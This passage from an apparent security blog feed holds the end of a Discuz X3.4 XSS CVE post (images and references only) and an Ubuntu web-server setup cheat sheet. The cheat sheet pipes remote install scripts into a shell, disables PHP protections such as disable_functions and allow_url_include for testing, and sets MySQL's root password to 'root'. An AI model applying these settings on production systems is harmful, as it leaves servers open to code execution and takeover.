src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/c20f32f9_12015184.png"></p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/d35d3b7c_12015184.png"></p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/0d4be145_12015184.png"></p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/b518294b_12015184.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://gitee.com/Discuz/DiscuzX/issues/I61CR2">Gitee Issue</a> (Login Required)</li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45543">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">Discuz-X3.4-SC_UTF8_20221111 with Backend Reflected Cross-Site Scripting in admin.php auditing content.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Web Server Environment Configuration CheatSheet</title>
    <link href="https://srpopty.github.io/2023/02/15/Web-Server-Environment-Configuration-CheatSheet/"/>
    <id>https://srpopty.github.io/2023/02/15/Web-Server-Environment-Configuration-CheatSheet/</id>
    <published>2023-02-15T07:19:15.000Z</published>
    <updated>2023-02-15T07:19:15.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Basic-Environment"><a href="#Basic-Environment" class="headerlink" title="Basic Environment"></a>Basic Environment</h1><p> 基础环境配置，安装常用 shell 工具。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade -y &amp;&amp; sudo apt-get dist-upgrade -y &amp;&amp; sudo apt autoremove -y</span><br><span class="line">sudo apt-get install -y zsh vim curl wget cloc unzip zip graphviz tree build-essential make cmake git openssh-server netcat net-tools tmux</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;set -g mouse on&quot;</span> &gt; ~/.tmux.conf</span><br></pre></td></tr></table></figure><h2 id="ZSH"><a href="#ZSH" class="headerlink" title="ZSH"></a>ZSH</h2><p> 安装 zsh，更换默认 shell 为 oh-my-zsh，同时安装语法高亮与自动补全插件，并且更换 zsh 的主题为 bira。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">chsh -s $(<span class="built_in">which</span> zsh)</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh</span><br><span class="line"><span class="built_in">cp</span> ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br><span class="line">sed -i <span class="string">&#x27;s/plugins=(git)/plugins=(git zsh-syntax-highlighting zsh-autosuggestions)/g&#x27;</span> ~/.zshrc</span><br><span class="line">sed -i <span class="string">&#x27;s/ZSH_THEME=&quot;robbyrussell&quot;/ZSH_THEME=&quot;bira&quot;/g&#x27;</span> ~/.zshrc</span><br></pre></td></tr></table></figure><h2 id="V2ray"><a href="#V2ray" class="headerlink" title="V2ray"></a>V2ray</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo bash &lt;(curl -L https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.sh)</span><br><span class="line">sudo vim /usr/local/etc/v2ray/config.json</span><br></pre></td></tr></table></figure><h1 id="Web-Server"><a href="#Web-Server" class="headerlink" title="Web Server"></a>Web Server</h1><h2 id="Apache2"><a href="#Apache2" class="headerlink" title="Apache2"></a>Apache2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y apache2</span><br></pre></td></tr></table></figure><h3 id="Apache2-Configuration"><a href="#Apache2-Configuration" class="headerlink" title="Apache2 Configuration"></a>Apache2 Configuration</h3><p> 修改 Apache2 mpm-prefork 模式的并发数量。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&quot;s/StartServers\s+\d+/StartServers 20/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MinSpareServers\s+\d+/MinSpareServers 20/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MaxSpareServers\s+\d+/MaxSpareServers 30/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MaxClients\s+\d+/MaxClients 500/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MaxRequestsPerChild\s+\d+/MaxRequestsPerChild 10000/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;11a\\\tServerLimit 500&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br></pre></td></tr></table></figure><p> 开启 URL 重写，设置默认的 ServerName，并重启 Apache。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&quot;s/AllowOverride None/AllowOverride ALL/g&quot;</span> /etc/apache2/apache2.conf</span><br><span class="line">sudo a2enmod rewrite</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ServerName localhost&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/apache2/apache2.conf</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure><h1 id="Server-Side-Languages"><a href="#Server-Side-Languages" class="headerlink" title="Server-Side Languages"></a>Server-Side Languages</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y php libapache2-mod-php</span><br></pre></td></tr></table></figure><h3 id="Dependency"><a href="#Dependency" class="headerlink" title="Dependency"></a>Dependency</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y <span class="string">&quot;php-(bcmath|gmp|ldap|simplexml|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure><h3 id="Composer"><a href="#Composer" class="headerlink" title="Composer"></a>Composer</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&quot;copy(&#x27;https://getcomposer.org/installer&#x27;, &#x27;composer-setup.php&#x27;);&quot;</span>;</span><br><span class="line">sudo php composer-setup.php --install-dir=/usr/bin --filename=composer;</span><br><span class="line"><span class="built_in">rm</span> composer-setup.php</span><br></pre></td></tr></table></figure><h3 id="PHP-Multi-Version"><a href="#PHP-Multi-Version" class="headerlink" title="PHP Multi-Version"></a>PHP Multi-Version</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ondrej/php &amp;&amp; sudo add-apt-repository ppa:ondrej/apache2</span><br><span class="line"><span class="comment"># Install another php.</span></span><br><span class="line">sudo apt-get install -y php5.6 php7.4 php8.1</span><br><span class="line">sudo apt-get install -y <span class="string">&quot;php5.6-(bcmath|gmp|ldap|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo apt-get install -y <span class="string">&quot;php7.4-(bcmath|gmp|ldap|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo apt-get install -y <span class="string">&quot;php8.1-(bcmath|gmp|ldap|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade -y &amp;&amp; sudo apt-get dist-upgrade -y &amp;&amp; sudo apt autoremove -y</span><br><span class="line"><span class="comment"># Switch php for apache. Disable current used php.</span></span><br><span class="line">sudo a2dismod php-7.4</span><br><span class="line"><span class="comment"># Enable the php which you want to use.</span></span><br><span class="line">sudo a2enmod php-8.1</span><br><span class="line"><span class="comment"># Reboot server.</span></span><br><span class="line">sudo systemctl restart apache2</span><br><span class="line"><span class="comment"># Switch php for commandline.</span></span><br><span class="line">sudo update-alternatives --config php</span><br></pre></td></tr></table></figure><h3 id="PHP-INI-Configuration"><a href="#PHP-INI-Configuration" class="headerlink" title="PHP INI Configuration"></a>PHP INI Configuration</h3><p> 仅在测试环境下可能会用到的配置，为了便于 debug。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&quot;s/disable_functions = /; disable_functions = /g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/max_execution_time = 30/max_execution_time = 60/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/max_input_time = 60/max_input_time = -1/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/;max_input_vars = 1000/max_input_vars = 3000/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/memory_limit = 128M/memory_limit = 256M/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/display_errors = Off/display_errors = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/display_startup_errors = Off/display_startup_errors = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/post_max_size = 8M/post_max_size = 32M/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/allow_url_include = Off/allow_url_include = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/;mysqli.allow_local_infile = On/mysqli.allow_local_infile = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/session.gc_maxlifetime = 1440/session.gc_maxlifetime = 259200/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/session.cookie_lifetime = 0/session.cookie_lifetime = 259200/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y default-jdk</span><br></pre></td></tr></table></figure><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y python2 python3 python3-pip python3-flask python3-django python3-requests python3-venv</span><br></pre></td></tr></table></figure><h2 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -</span><br><span class="line">sudo apt-get install -y nodejs</span><br></pre></td></tr></table></figure><h2 id="GO"><a href="#GO" class="headerlink" title="GO"></a>GO</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:longsleep/golang-backports</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y golang-go</span><br></pre></td></tr></table></figure><h2 id="Rust"><a href="#Rust" class="headerlink" title="Rust"></a>Rust</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --proto <span class="string">&#x27;=https&#x27;</span> --tlsv1.2 -sSf https://sh.rustup.rs | sh</span><br></pre></td></tr></table></figure><h2 id="C-C"><a href="#C-C" class="headerlink" title="C/C++"></a>C/C++</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y gcc g++</span><br></pre></td></tr></table></figure><h1 id="Database"><a href="#Database" class="headerlink" title="Database"></a>Database</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p> 注意安装完成后需要从 <code>/etc/mysql/debian.cnf</code> 中获取默认的 MySQL 用户名和密码，用此用户名密码登录成功后再修改 root 的密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y mysql-server mysql-client</span><br><span class="line"><span class="comment"># Get mysql default username.</span></span><br><span class="line">sudo <span class="built_in">cat</span> /etc/mysql/debian.cnf | grep user</span><br><span class="line"><span class="comment"># Get mysql default password.</span></span><br><span class="line">sudo <span class="built_in">cat</span> /etc/mysql/debian.cnf | grep password</span><br><span class="line"><span class="comment"># Using it to login mysqsl.</span></span><br><span class="line">mysql -u xxxx -p</span><br><span class="line"><span class="comment"># Change password to &quot;root&quot;.</span></span><br><span class="line">mysql&gt; alter user <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified with mysql_native_password by <span class="string">&#x27;root&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y redis</span><br></pre></td></tr></table></figure><h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y sqlite3</span><br></pre></td></tr></table></figure><h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y postgresql</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Shell commands for web server environment configuration in Ubuntu, quickly build a web server environment.</summary>
    
    
    
    <category term="CheatSheet" scheme="https://srpopty.github.io/categories/CheatSheet/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
  </entry>
  
</feed>
